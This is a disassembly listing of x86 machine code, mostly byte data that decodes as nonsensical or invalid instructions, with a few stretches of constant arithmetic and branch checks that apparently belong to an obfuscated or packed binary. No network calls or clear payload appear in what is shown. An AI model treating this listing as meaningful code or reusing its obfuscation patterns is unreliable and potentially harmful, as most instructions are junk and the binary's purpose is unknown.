  40bc23:	mov    ch,0x34
  40bc25:	pop    ss
  40bc26:	mov    ah,cl
  40bc28:	push   ss
  40bc29:	mov    edi,0x8f49cca0
  40bc2e:	inc    ebx
  40bc2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc30:	jne    0x40bbc9
  40bc32:	jecxz  0x40bc9b
  40bc34:	mov    dl,0x8c
  40bc36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc37:	push   0xffffffbc
  40bc39:	nop
  40bc3a:	mov    ebx,0x233fa41e
  40bc3f:	pop    edi
  40bc40:	adc    DWORD PTR [esi],ebx
  40bc42:	sub    eax,0x4ac48dc2
  40bc47:	fs mov edi,0xa8e14145
  40bc4d:	sub    eax,0x74d2e5cd
  40bc52:	mov    dl,0xd4
  40bc54:	sahf   
  40bc55:	aad    0xa0
  40bc57:	pop    es
  40bc58:	jb     0x40bc30
  40bc5a:	or     ecx,ecx
  40bc5c:	xor    bl,dh
  40bc5e:	mov    ebp,0xd1f64082
  40bc63:	dec    ebx
  40bc64:	stos   BYTE PTR es:[edi],al
  40bc65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc66:	dec    ebp
  40bc67:	bound  edi,QWORD PTR [ebp-0x67]
  40bc6a:	wbinvd 
  40bc6c:	(bad)  
  40bc6d:	ror    esp,1
  40bc6f:	ror    esp,1
  40bc71:	jnp    0x40bc1f
  40bc73:	aaa    
  40bc74:	(bad)  
  40bc75:	fs pop ebx
  40bc77:	and    DWORD PTR [edx],ecx
  40bc79:	fiadd  WORD PTR fs:[ecx-0x66]
  40bc7d:	add    DWORD PTR [esi],esp
  40bc7f:	(bad)  
  40bc80:	aaa    
  40bc81:	push   esi
  40bc82:	mov    ebx,0xaf070257
  40bc87:	pop    eax
  40bc88:	xchg   DWORD PTR [ebx],edx
  40bc8a:	mov    esp,0x8fa2960b
  40bc8f:	pop    ds
  40bc90:	(bad)  
  40bc91:	(bad)  
  40bc92:	in     eax,0x6b
  40bc94:	jecxz  0x40bceb
  40bc96:	fs push ecx
  40bc98:	ret    0x6861
  40bc9b:	adc    cl,ch
  40bc9d:	fwait
  40bc9e:	scas   al,BYTE PTR es:[edi]
  40bc9f:	jo     0x40bc56
  40bca1:	pushw  ss
  40bca3:	inc    ebx
  40bca4:	imul   bl
  40bca6:	push   0x6b
  40bca8:	stos   BYTE PTR es:[edi],al
  40bca9:	cmc    
  40bcaa:	ins    DWORD PTR es:[edi],dx
  40bcab:	inc    edi
  40bcac:	leave  
  40bcad:	arpl   WORD PTR [ebp+0x74],cx
  40bcb0:	out    dx,eax
  40bcb1:	(bad)  
  40bcb2:	cmc    
  40bcb3:	push   cs
  40bcb4:	xchg   edi,eax
  40bcb5:	jg     0x40bcc9
  40bcb7:	aas    
  40bcb8:	pop    ss
  40bcb9:	mov    dh,0x6f
  40bcbb:	lahf   
  40bcbc:	fcom   QWORD PTR [eax]
  40bcbe:	(bad)  
  40bcbf:	(bad)  
  40bcc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcc1:	mov    ebp,DWORD PTR [ebx]
  40bcc3:	dec    esi
  40bcc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcc5:	xchg   esp,eax
  40bcc6:	stc    
  40bcc7:	add    DWORD PTR [ebp-0x24b48a4a],0x7e
  40bcce:	push   ecx
  40bccf:	in     al,dx
  40bcd0:	dec    ecx
  40bcd1:	test   BYTE PTR [ecx*4-0x6ac00a0c],bh
  40bcd8:	mov    dh,BYTE PTR [esi+0x42e2f276]
  40bcde:	cmp    bh,ch
  40bce0:	cmp    BYTE PTR [ecx-0x49],bh
  40bce3:	cmp    ecx,ebp
  40bce5:	adc    eax,0x757230a7
  40bcea:	(bad)  
  40bceb:	sub    edx,esp
  40bced:	pop    ebp
  40bcee:	cmp    ch,dh
  40bcf0:	loope  0x40bc91
  40bcf2:	ja     0x40bcf1
  40bcf4:	retf   0xebee
  40bcf7:	jg     0x40bd09
  40bcf9:	cmp    al,0x2e
  40bcfb:	fsubr  st(6),st
  40bcfd:	popa   
  40bcfe:	pop    ecx
  40bcff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd00:	rol    BYTE PTR [esi],cl
  40bd02:	aas    
  40bd03:	dec    ecx
  40bd04:	lock sar ecx,cl
  40bd07:	(bad)  
  40bd08:	in     eax,dx
  40bd09:	mov    al,ds:0xb2808253
  40bd0e:	jl     0x40bcbc
  40bd10:	add    bl,al
  40bd12:	lods   eax,DWORD PTR ds:[esi]
  40bd13:	dec    DWORD PTR [eax+0x72]
  40bd16:	icebp  
  40bd17:	cwde   
  40bd18:	and    DWORD PTR [ecx+edi*1],edx
  40bd1b:	xchg   esp,eax
  40bd1c:	out    dx,eax
  40bd1d:	dec    eax
  40bd1e:	jl     0x40bd42
  40bd20:	loop   0x40bcc3
  40bd22:	rcl    BYTE PTR [edi+eiz*1-0x3d],cl
  40bd26:	js     0x40bcc6
  40bd28:	dec    ebp
  40bd29:	(bad)  
  40bd2a:	js     0x40bd0d
  40bd2c:	pop    es
  40bd2d:	outs   dx,BYTE PTR ds:[esi]
  40bd2e:	fs xchg ebx,eax
  40bd30:	loopne 0x40bd62
  40bd32:	(bad)  
  40bd34:	push   ebx
  40bd35:	retf   
  40bd36:	stos   BYTE PTR es:[edi],al
  40bd37:	jns    0x40bdb1
  40bd39:	sbb    DWORD PTR [ebp+0xd6496fa],ecx
  40bd3f:	f2xm1  
  40bd41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd42:	dec    ecx
  40bd43:	cdq    
  40bd44:	xlat   BYTE PTR ds:[ebx]
  40bd45:	ja     0x40bd30
  40bd47:	sub    eax,0x6958468d
  40bd4c:	lock outs dx,BYTE PTR ds:[esi]
  40bd4e:	cmp    edx,DWORD PTR [edx]
  40bd50:	jmp    0x40bdc1
  40bd52:	(bad)
  40bd57:	aad    0xb0
  40bd59:	mov    ah,0x4a
  40bd5b:	cld    
  40bd5c:	out    0x12,eax
  40bd5e:	dec    ecx
  40bd5f:	fcomp  QWORD PTR [esi+0x2d]
  40bd62:	sbb    al,0x85
  40bd64:	lahf   
  40bd65:	push   ebp
  40bd66:	call   0x399c:0x8bb83431
  40bd6d:	mov    ch,0x37
  40bd6f:	pop    ecx
  40bd70:	in     eax,dx
  40bd71:	push   ebx
  40bd72:	and    cl,bl
  40bd74:	test   BYTE PTR [ecx+0x3f],0xd4
  40bd78:	mov    edi,0x2a4c5713
  40bd7d:	aad    0x9f
  40bd7f:	rol    dh,1
  40bd81:	ret    
  40bd82:	jo     0x40bd34
  40bd84:	cli    
  40bd85:	(bad)  
  40bd86:	xor    DWORD PTR [esi+eax*8],ebx
  40bd89:	mov    esp,0xa4e4800c
  40bd8e:	adc    cl,cl
  40bd90:	jmp    0xf6bd:0x7d8092c1
  40bd97:	(bad)  
  40bd98:	mov    dl,0x1b
  40bd9a:	sbb    bl,BYTE PTR [ecx-0x55]
  40bd9d:	adc    ch,BYTE PTR [eax-0x1f8adb]
  40bda3:	adc    al,0x54
  40bda5:	cmp    edx,DWORD PTR [eax]
  40bda7:	(bad)  
  40bda8:	loopne 0x40be29
  40bdaa:	xrelease mov DWORD PTR [eax+esi*1+0xe],esi
  40bdaf:	arpl   WORD PTR [eax-0x5a81c85d],dx
  40bdb5:	push   ss
  40bdb6:	cwde   
  40bdb7:	push   edi
  40bdb8:	mov    al,BYTE PTR [esi+edx*2-0x3265e04b]
  40bdbf:	push   edx
  40bdc0:	dec    ebp
  40bdc1:	clc    
  40bdc2:	fbstp  TBYTE PTR [ecx+edx*8-0x7b74df80]
  40bdc9:	repnz add DWORD PTR [eax-0x41],ecx
  40bdcd:	fild   DWORD PTR [ebx]
  40bdcf:	fucomp st(7)
  40bdd1:	and    bl,BYTE PTR [esi]
  40bdd3:	sbb    ecx,DWORD PTR [edi-0x3babc4e2]
  40bdd9:	test   DWORD PTR [ebp-0x26cda96f],edi
  40bddf:	sbb    eax,0x1798ceaf
  40bde4:	ss in  eax,dx
  40bde6:	retf   
  40bde7:	test   eax,0x27a885f0
  40bdec:	imul   ecx,DWORD PTR [esi-0x17114737],0x24
  40bdf3:	sbb    al,0x64
  40bdf5:	lods   eax,DWORD PTR ds:[esi]
  40bdf6:	ret    
  40bdf7:	shl    DWORD PTR [esi],cl
  40bdf9:	or     ebx,DWORD PTR [ebx]
  40bdfb:	xchg   DWORD PTR [eax-0x16],ecx
  40bdfe:	test   al,0x24
  40be00:	retf   0xeae0
  40be03:	enter  0x1ae7,0xfa
  40be07:	das    
  40be08:	dec    ebp
  40be09:	nop
  40be0a:	jmp    0x4ef22a12
  40be0f:	int    0x3f
  40be11:	frstor [edi+0x16]
  40be14:	(bad)  
  40be15:	lahf   
  40be16:	outs   dx,BYTE PTR ds:[esi]
  40be17:	enter  0x9e9d,0x75
  40be1b:	mov    dl,0x80
  40be1d:	mov    edi,0x66e1ff21
  40be22:	sub    ecx,eax
  40be24:	mov    al,ds:0x9229098
  40be29:	jno    0x40bdb1
  40be2b:	inc    esi
  40be2c:	pop    eax
  40be2d:	mov    dl,0x4e
  40be2f:	lock pop edi
  40be31:	sub    edx,edi
  40be33:	ins    DWORD PTR es:[edi],dx
  40be34:	or     DWORD PTR [ebx+0x7ce0f6f],ebp
  40be3a:	sbb    ecx,edi
  40be3c:	scas   al,BYTE PTR es:[edi]
  40be3d:	pop    ebp
  40be3e:	jno    0x40be4d
  40be40:	fisttp DWORD PTR [ebx+0x24]
  40be43:	mov    esp,0x42e46cf3
  40be48:	cli    
  40be49:	iret   
  40be4a:	iret   
  40be4b:	cwde   
  40be4c:	ja     0x40be7b
  40be4e:	push   0x19733f31
  40be53:	in     eax,dx
  40be54:	jae    0x40be6a
  40be56:	iret   
  40be57:	dec    ecx
  40be58:	adc    eax,0x636ca252
  40be5d:	and    al,0x7b
  40be5f:	sbb    DWORD PTR [ebx+0x46ed4a2c],esi
  40be65:	adc    ah,ah
  40be67:	fisub  WORD PTR [ecx]
  40be69:	dec    esi
  40be6a:	sbb    cl,ch
  40be6c:	cwde   
  40be6d:	test   al,0xcc
  40be6f:	nop
  40be70:	pushf  
  40be71:	or     edi,DWORD PTR [edi+ebx*1]
  40be74:	outs   dx,DWORD PTR es:[esi]
  40be76:	inc    ebx
  40be77:	lods   eax,DWORD PTR ds:[esi]
  40be78:	repz jne 0x40be60
  40be7b:	int    0x43
  40be7d:	(bad)  
  40be7f:	out    dx,eax
  40be80:	cmp    al,0xc2
  40be82:	jle    0x40bea9
  40be84:	call   0x897f42bc
  40be89:	dec    ebp
  40be8a:	hlt    
  40be8b:	mov    DWORD PTR [ebp-0x20],0x4a50
  40be92:	mov    DWORD PTR [ebp-0x1c],0x2079
  40be99:	mov    DWORD PTR [ebp-0x28],0x792e
  40bea0:	mov    DWORD PTR [ebp-0x24],0x10e8
  40bea7:	mov    DWORD PTR [ebp-0x30],0x22b3
  40beae:	mov    DWORD PTR [ebp-0x2c],0x2293
  40beb5:	mov    eax,DWORD PTR [ebp-0x30]
  40beb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bebb:	mov    edx,DWORD PTR [ebp-0x28]
  40bebe:	mov    esi,DWORD PTR [ebp-0x24]
  40bec1:	add    eax,edx
  40bec3:	mov    edx,DWORD PTR [ebp-0x20]
  40bec6:	adc    ecx,esi
  40bec8:	mov    esi,DWORD PTR [ebp-0x1c]
  40becb:	add    eax,0x3e60
  40bed0:	adc    ecx,0xd49e
  40bed6:	xor    eax,0x14ce
  40bedb:	xor    ecx,0x354f
  40bee1:	add    eax,edx
  40bee3:	mov    edx,DWORD PTR [ebp-0x10]
  40bee6:	adc    ecx,esi
  40bee8:	mov    esi,DWORD PTR [ebp-0xc]
  40beeb:	cmp    edx,eax
  40beed:	jne    0x40befb
  40bef3:	cmp    esi,ecx
  40bef5:	je     0x40cc06
  40befb:	mov    DWORD PTR [ebp-0x28],0x4db
  40bf02:	mov    DWORD PTR [ebp-0x24],0x233b
  40bf09:	mov    DWORD PTR [ebp-0x30],0x2c94
  40bf10:	push   0x6b33
  40bf15:	mov    DWORD PTR [ebp-0x2c],0x647f
  40bf1c:	mov    eax,DWORD PTR [ebp-0x30]
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bf22:	push   0x7c8f
  40bf27:	push   ecx
  40bf28:	push   eax
  40bf29:	call   0x416c20
  40bf2e:	mov    ecx,DWORD PTR [ebp-0x28]
  40bf31:	mov    esi,DWORD PTR [ebp-0x24]
  40bf34:	push   0x4e1a18a
  40bf39:	push   0x283cdcc
  40bf3e:	and    edx,esi
  40bf40:	and    eax,ecx
  40bf42:	push   edx
  40bf43:	jmp    0x40c339
  40bf48:	fst    DWORD PTR [ebp-0x17]
  40bf4b:	or     eax,0x4c9c1c65
  40bf50:	push   ds
  40bf51:	jp     0x40bede
  40bf53:	jo     0x40bf5a
  40bf55:	out    0x59,al
  40bf57:	stos   BYTE PTR es:[edi],al
  40bf58:	mov    dh,0x5
  40bf5a:	sbb    BYTE PTR [eax],bl
  40bf5c:	outs   dx,BYTE PTR ds:[esi]
  40bf5d:	adc    bl,BYTE PTR [eax]
  40bf5f:	sbb    BYTE PTR [ecx],dl
  40bf61:	sub    BYTE PTR [ecx],dl
  40bf63:	daa    
  40bf64:	cmp    eax,0x3ea4fde8
  40bf69:	into   
  40bf6a:	das    
  40bf6b:	xchg   edi,eax
  40bf6c:	pushf  
  40bf6d:	inc    ebp
  40bf6e:	mov    edx,0x18563086
  40bf73:	cmp    esi,DWORD PTR [ecx+0x39]
  40bf76:	sub    ebp,esp
  40bf78:	mov    DWORD PTR [esi],ecx
  40bf7a:	mov    WORD PTR [esi-0x7a],fs
  40bf7d:	sub    DWORD PTR [edx+ebp*4-0x1e],ebx
  40bf81:	pop    eax
  40bf82:	add    BYTE PTR [edx+ebp*4],ah
  40bf85:	fsubp  st(3),st
  40bf87:	cmp    ch,bh
  40bf89:	sub    eax,0x756b8ffe
  40bf8e:	idiv   BYTE PTR [ebx]
  40bf90:	cmp    ebp,DWORD PTR [edx+ebp*8+0x72]
  40bf94:	pop    eax
  40bf96:	jae    0x40bf81
  40bf98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf99:	clc    
  40bf9a:	sbb    ah,BYTE PTR [eax]
  40bf9c:	and    ecx,ebp
  40bf9e:	jmp    0x1acc78
  40bfa3:	sbb    esi,ecx
  40bfa5:	ins    DWORD PTR es:[edi],dx
  40bfa6:	push   ebx
  40bfa7:	stc    
  40bfa8:	(bad)  
  40bfa9:	out    0xf4,al
  40bfab:	xchg   ecx,eax
  40bfac:	pop    ss
  40bfad:	xchg   ebp,eax
  40bfae:	(bad)  
  40bfaf:	mov    edi,0xd47b87eb
  40bfb4:	test   eax,0x5a7fc997
  40bfb9:	inc    ecx
  40bfba:	pop    es
  40bfbb:	es gs mov ecx,0x475103f7
  40bfc2:	jl     0x40bf67
  40bfc4:	fdivr  DWORD PTR [ebx]
  40bfc6:	mov    al,0x91
  40bfc8:	scas   eax,DWORD PTR es:[edi]
  40bfc9:	xor    dh,BYTE PTR [esi+0x9]
  40bfcc:	inc    ecx
  40bfcd:	xchg   DWORD PTR [ebx],edx
  40bfcf:	dec    eax
  40bfd0:	sub    edi,esi
  40bfd2:	mov    eax,0x32789a94
  40bfd7:	(bad)  
  40bfd8:	mov    al,ds:0x83df81d4
  40bfdd:	jg     0x40bf7d
  40bfdf:	jecxz  0x40c04a
  40bfe1:	xlat   BYTE PTR ds:[ebx]
  40bfe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfe3:	jbe    0x40bf66
  40bfe5:	inc    esi
  40bfe6:	and    al,0xa
  40bfe8:	mov    bh,0x96
  40bfea:	xor    esp,ebx
  40bfec:	std    
  40bfed:	cli    
  40bfee:	pusha  
  40bfef:	bound  edi,QWORD PTR [ecx]
  40bff1:	push   0x27
  40bff3:	fcomp  QWORD PTR [edi+eax*8-0x5]
  40bff7:	sbb    ecx,DWORD PTR [esi+edx*4+0x2]
  40bffb:	push   ebx
  40bffc:	and    eax,0x50e036ab
  40c001:	fadd   QWORD PTR [edx-0xc]
  40c004:	in     eax,dx
  40c005:	ror    DWORD PTR [esi-0x2fb47ee],0x1e
  40c00c:	xor    BYTE PTR [edx+0x775a0f13],cl
  40c012:	sub    BYTE PTR [esi-0xb],0x9
  40c016:	push   edi
  40c017:	outs   dx,BYTE PTR ds:[esi]
  40c018:	sti    
  40c019:	adc    DWORD PTR [edi],ebp
  40c01b:	dec    edi
  40c01c:	inc    esp
  40c01d:	sbb    al,0xe6
  40c01f:	xlat   BYTE PTR ds:[ebx]
  40c020:	call   0x2155dabd
  40c025:	in     al,dx
  40c026:	(bad)  
  40c028:	test   eax,0x93cd4730
  40c02d:	pusha  
  40c02e:	out    0xe3,eax
  40c030:	mov    BYTE PTR [ecx+0x36],bl
  40c033:	dec    esp
  40c034:	stos   BYTE PTR es:[edi],al
  40c035:	xchg   esi,eax
  40c036:	pop    eax
  40c037:	inc    esi
  40c038:	(bad)  
  40c03c:	adc    al,BYTE PTR [esp+ebp*8]
  40c03f:	test   eax,0x53c82f48
  40c044:	mov    dh,0x11
  40c046:	(bad)
  40c04a:	xor    al,0x10
  40c04c:	or     bh,dl
  40c04e:	repz sub eax,0x93decee7
  40c054:	pop    esp
  40c055:	loopne 0x40bfdb
  40c057:	fs popa 
  40c059:	pop    eax
  40c05a:	cmp    BYTE PTR [esi],al
  40c05c:	sub    ah,BYTE PTR [ebx+ecx*2+0x49]
  40c060:	inc    ecx
  40c061:	and    BYTE PTR [esi-0x8],0xbb
  40c065:	addr16 xchg esp,eax
  40c067:	cs pop ebx
  40c069:	rcl    DWORD PTR [ecx],cl
  40c06b:	cmp    DWORD PTR ds:0xa07939db,edx
  40c071:	cmp    DWORD PTR [edi],edi
  40c073:	lahf   
  40c074:	out    dx,al
  40c075:	jl     0x40c0e9
  40c077:	push   esi
  40c078:	ins    DWORD PTR es:[edi],dx
  40c079:	mov    dh,0x10
  40c07b:	fmul   st,st(2)
  40c07d:	mov    dl,0x5b
  40c07f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c080:	out    0x96,eax
  40c082:	sbb    ebp,DWORD PTR [ecx-0x632a2634]
  40c088:	jnp    0x40c063
  40c08a:	dec    edx
  40c08b:	fs (bad) 
  40c08d:	xchg   ecx,eax
  40c08e:	or     al,0xae
  40c090:	in     al,0xda
  40c092:	xor    bl,dh
  40c094:	fwait
  40c095:	mov    ebp,0x81c1de32
  40c09a:	pop    ebp
  40c09b:	inc    ecx
  40c09c:	ss mov ebp,0xc831b95a
  40c0a2:	call   0x278e166b
  40c0a7:	adc    eax,ebx
  40c0a9:	jmp    0x62574b0b
  40c0ae:	mov    ds:0x5de18b5e,eax
  40c0b3:	out    dx,eax
  40c0b4:	pop    ds
  40c0b5:	jne    0x40c0de
  40c0b7:	adc    ecx,DWORD PTR [eax+0x78]
  40c0ba:	push   esi
  40c0bb:	test   DWORD PTR ds:0xf0e5bc11,esi
  40c0c1:	cmp    eax,0x6f38cd27
  40c0c6:	inc    edx
  40c0c7:	ins    DWORD PTR es:[edi],dx
  40c0c8:	scas   eax,DWORD PTR es:[edi]
  40c0c9:	in     eax,0x97
  40c0cb:	mov    ds:0xb10f590d,eax
  40c0d0:	add    edx,ebp
  40c0d2:	nop
  40c0d3:	outs   dx,BYTE PTR ds:[esi]
  40c0d4:	and    edi,DWORD PTR [eax]
  40c0d6:	fldl2t 
  40c0d8:	dec    esi
  40c0d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0da:	fldenv [ebp+0x311f9a]
  40c0e0:	in     eax,dx
  40c0e1:	cmp    al,0xce
  40c0e3:	mov    DWORD PTR [ebx],eax
  40c0e5:	cmp    DWORD PTR [edi-0xe],ecx
  40c0e8:	out    0xe9,eax
  40c0ea:	dec    esi
  40c0eb:	adc    BYTE PTR [ebx+edx*4+0x3a9c81d6],bh
  40c0f2:	dec    edi
  40c0f3:	fwait
  40c0f4:	jecxz  0x40c0a0
  40c0f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0f7:	lahf   
  40c0f8:	daa    
  40c0f9:	xor    DWORD PTR [ebx-0x5f],eax
  40c0fc:	mov    ds:0xd0e864f5,al
  40c101:	xor    eax,DWORD PTR [ecx+edi*2+0x6028f327]
  40c108:	dec    ecx
  40c109:	mov    ecx,0x125080ed
  40c10e:	sbb    ebp,esp
  40c110:	popf   
  40c111:	adc    dl,BYTE PTR [ebx-0x6b]
  40c114:	je     0x40c17f
  40c116:	jae    0x40c0f0
  40c118:	shr    BYTE PTR [ebp+edi*2+0xe],1
  40c11c:	out    dx,al
  40c11d:	es inc edx
  40c11f:	mov    es,ebp
  40c121:	test   bl,ah
  40c123:	jp     0x40c0d1
  40c125:	push   ebx
  40c126:	sar    DWORD PTR [ecx-0x39],1
  40c129:	fwait
  40c12a:	mov    esi,0x1b58e2ac
  40c12f:	gs dec eax
  40c131:	leave  
  40c132:	jmp    0x1a320a5f
  40c137:	bound  ecx,QWORD PTR [ecx-0x4c]
  40c13a:	out    dx,eax
  40c13b:	loopne 0x40c159
  40c13d:	xchg   BYTE PTR [ebx+0x43906aa5],al
  40c143:	loop   0x40c140
  40c145:	sbb    al,0xd2
  40c147:	jge    0x40c0d3
  40c149:	cmp    eax,DWORD PTR [edx]
  40c14b:	(bad)  
  40c14c:	repnz retf 
  40c14e:	dec    ebp
  40c14f:	and    BYTE PTR [ebx-0x3d234c59],0xa8
  40c156:	inc    ebx
  40c157:	pop    esi
  40c158:	fwait
  40c159:	and    eax,0xad7ea152
  40c15e:	xor    bh,BYTE PTR [esi+0x41]
  40c161:	pop    edx
  40c162:	sub    eax,ecx
  40c164:	cmp    bl,ah
  40c166:	stc    
  40c167:	add    dh,dl
  40c169:	dec    esi
  40c16a:	cmp    DWORD PTR [esi-0x58],edi
  40c16d:	push   ss
  40c16e:	push   0x56a57104
  40c173:	call   0xa751:0x22aa7348
  40c17a:	(bad)  
  40c17b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c17c:	mov    ds:0xbdf785d4,al
  40c181:	test   eax,0x1d2c7bea
  40c186:	mov    WORD PTR [edx-0x3d],cs
  40c189:	sahf   
  40c18a:	push   ss
  40c18b:	mov    al,0x11
  40c18d:	(bad)  
  40c18e:	loop   0x40c132
  40c190:	xchg   ebp,eax
  40c191:	add    ebx,DWORD PTR [ecx+ecx*8-0x4e]
  40c195:	or     eax,0xef93756a
  40c19a:	mov    edx,0xcc41349b
  40c19f:	add    al,BYTE PTR [esi]
  40c1a1:	pop    esi
  40c1a2:	cmp    eax,0x783ddb70
  40c1a7:	adc    DWORD PTR [esi-0x38],esi
  40c1aa:	test   BYTE PTR [ebx-0x2d35e02a],dh
  40c1b0:	popf   
  40c1b1:	adc    esp,DWORD PTR [ebp+ecx*1+0x7f4050d4]
  40c1b8:	fst    DWORD PTR [ecx]
  40c1ba:	mov    ebp,edi
  40c1bc:	jnp    0x40c1aa
  40c1be:	cs mov eax,0x4281bc6c
  40c1c4:	out    dx,al
  40c1c5:	test   al,0xa3
  40c1c7:	push   ebx
  40c1c8:	mov    dh,0x40
  40c1ca:	and    BYTE PTR [ebx-0x53],dl
  40c1cd:	fcom   QWORD PTR [edx+ebx*1+0x60]
  40c1d1:	(bad)  
  40c1d2:	push   eax
  40c1d3:	lea    esp,[ecx+ebp*2]
  40c1d6:	sbb    ah,BYTE PTR ds:0x15dd5394
  40c1dc:	sub    al,0x3d
  40c1de:	arpl   WORD PTR [ecx-0x64],si
  40c1e1:	and    dl,BYTE PTR [edx+0x4efce4d4]
  40c1e7:	inc    esi
  40c1e8:	(bad)  [edi-0x58]
  40c1eb:	sbb    ebp,ebp
  40c1ed:	jmp    0x1d3b9678
  40c1f2:	out    0x4c,al
  40c1f4:	stos   DWORD PTR es:[edi],eax
  40c1f5:	shl    BYTE PTR [eax],1
  40c1f7:	cs pop esp
  40c1f9:	(bad)
  40c1fc:	cmp    DWORD PTR [esp+ebp*4-0x2fdf871b],0xc35efa3c
  40c207:	mov    ch,0x47
  40c209:	mov    eax,ds:0xd0c1b34b
  40c20e:	add    DWORD PTR [ebx+0x6b],edi
  40c211:	out    0x93,eax
  40c213:	imul   esp,DWORD PTR [esi+0x2c],0xffffffe8
  40c217:	mov    al,0xba
  40c219:	cmp    DWORD PTR [esi-0x75122b9e],esp
  40c21f:	arpl   bx,cx
  40c221:	dec    eax
  40c222:	sbb    DWORD PTR [eax+0x5d],ebp
  40c225:	xchg   al,dl
  40c227:	gs imul ecx
  40c22a:	xor    al,0xc
  40c22c:	and    DWORD PTR ds:[esp+esi*4-0x79],esi
  40c231:	cs jns 0x40c271
  40c234:	jbe    0x40c25c
  40c236:	(bad)  
  40c238:	jp     0x40c294
  40c23a:	int3   
  40c23b:	mov    eax,ds:0xec839e5b
  40c240:	in     al,dx
  40c241:	push   ebx
  40c242:	and    esi,esp
  40c244:	sub    esp,DWORD PTR [edi-0x5a016105]
  40c24a:	ss mov dl,ch
  40c24d:	sbb    bh,dh
  40c24f:	cmp    eax,0x4ba728c6
  40c254:	out    0x3d,al
  40c256:	dec    eax
  40c257:	mov    ds:0x8110e91b,eax
  40c25c:	in     eax,dx
  40c25d:	add    eax,0x99802d85
  40c262:	adc    eax,0x44ae97ae
  40c267:	outs   dx,DWORD PTR ds:[esi]
  40c268:	cmp    edx,DWORD PTR [ebx-0x6c65839c]
  40c26e:	push   ds
  40c26f:	xchg   BYTE PTR [ebx],al
  40c271:	enter  0xc79f,0x8a
  40c275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c276:	xchg   eax,eax
  40c278:	mov    cl,0x8a
  40c27a:	lods   al,BYTE PTR ds:[esi]
  40c27b:	fisttp QWORD PTR [esi+0x8]
  40c27e:	mov    dh,BYTE PTR [edx]
  40c280:	push   ebx
  40c281:	(bad)  
  40c282:	int    0x19
  40c284:	mov    al,ds:0xf7df2a21
  40c289:	test   al,0x38
  40c28b:	rol    dh,1
  40c28d:	xchg   DWORD PTR [ebx],esi
  40c28f:	mov    ebp,0x7a5a49d3
  40c294:	pop    ecx
  40c295:	dec    edi
  40c296:	jmp    0x234aa570
  40c29b:	rcl    DWORD PTR [ebx+0x4b],cl
  40c29e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c29f:	out    0x75,al
  40c2a1:	xor    eax,0x9b2f11f5
  40c2a6:	aaa    
  40c2a7:	push   esp
  40c2a8:	dec    edi
  40c2a9:	jne    0x40c291
  40c2ab:	sub    al,0x34
  40c2ad:	mov    ch,0xaa
  40c2af:	jecxz  0x40c2ed
  40c2b1:	popa   
  40c2b2:	(bad)  
  40c2b3:	fstp   st(7)
  40c2b5:	pop    esp
  40c2b6:	in     al,0x6e
  40c2b8:	or     BYTE PTR [ebx+0x18],ah
  40c2bb:	test   BYTE PTR [edx],dl
  40c2bd:	mov    ch,0x5c
  40c2bf:	jmp    DWORD PTR ds:0xbde99972
  40c2c5:	mov    bh,0xcd
  40c2c7:	clc    
  40c2c8:	test   eax,0x9a20d2db
  40c2cd:	push   edx
  40c2ce:	mov    cl,0x75
  40c2d0:	xchg   ebx,eax
  40c2d1:	int3   
  40c2d2:	pop    ebx
  40c2d3:	add    al,0xf4
  40c2d5:	xchg   ebx,eax
  40c2d6:	in     al,0x74
  40c2d8:	aaa    
  40c2d9:	or     BYTE PTR [esi],dh
  40c2db:	dec    esi
  40c2dc:	jb     0x40c275
  40c2de:	cmc    
  40c2df:	cli    
  40c2e0:	push   ecx
  40c2e1:	out    dx,eax
  40c2e2:	jg     0x40c332
  40c2e4:	test   eax,0xecaaf463
  40c2e9:	fdiv   st(4),st
  40c2eb:	cmp    DWORD PTR [edi-0x38137291],esp
  40c2f1:	iret   
  40c2f2:	jge    0x40c28d
  40c2f4:	pop    ebx
  40c2f5:	sbb    al,0xba
  40c2f7:	(bad)  
  40c2f8:	adc    BYTE PTR ds:0x69056b00,ah
  40c2fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2ff:	cmp    bl,cl
  40c301:	dec    edx
  40c302:	push   ecx
  40c303:	xor    DWORD PTR [ebp+eax*1-0x12],ecx
  40c307:	add    BYTE PTR [ecx+0x1264b501],bh
  40c30d:	dec    edi
  40c30e:	out    0x43,al
  40c310:	imul   ebp,DWORD PTR [eax-0x4d8645b0],0xffffffd3
  40c317:	jo     0x40c2e9
  40c319:	les    edx,FWORD PTR [eax+0x5bcc3376]
  40c31f:	out    0xe8,al
  40c321:	or     eax,0xdb84317b
  40c326:	sbb    ch,BYTE PTR [esi+0x43]
  40c329:	les    esi,FWORD PTR [edi]
  40c32b:	mov    ebx,0x3ed63069
  40c330:	outs   dx,DWORD PTR ds:[esi]
  40c331:	and    al,0x69
  40c333:	adc    eax,0xe7315d09
  40c338:	rcl    BYTE PTR [eax-0x18],0xe1
  40c33c:	test   al,0x0
  40c33e:	add    BYTE PTR ds:0x687b,dh
  40c344:	xor    edx,0x18d4
  40c34a:	mov    DWORD PTR [ebp-0x30],eax
  40c34d:	mov    DWORD PTR [ebp-0x2c],edx
  40c350:	mov    eax,ds:0x42274c
  40c355:	cmp    eax,0x7cd80819
  40c35a:	jne    0x40cc06
  40c360:	mov    eax,DWORD PTR [ebp-0x18]
  40c363:	mov    ecx,DWORD PTR [ebp-0x14]
  40c366:	mov    edx,DWORD PTR [ebp-0x18]
  40c369:	mov    esi,DWORD PTR [ebp-0x14]
  40c36c:	shrd   eax,ecx,0x2
  40c370:	shl    edx,0x1e
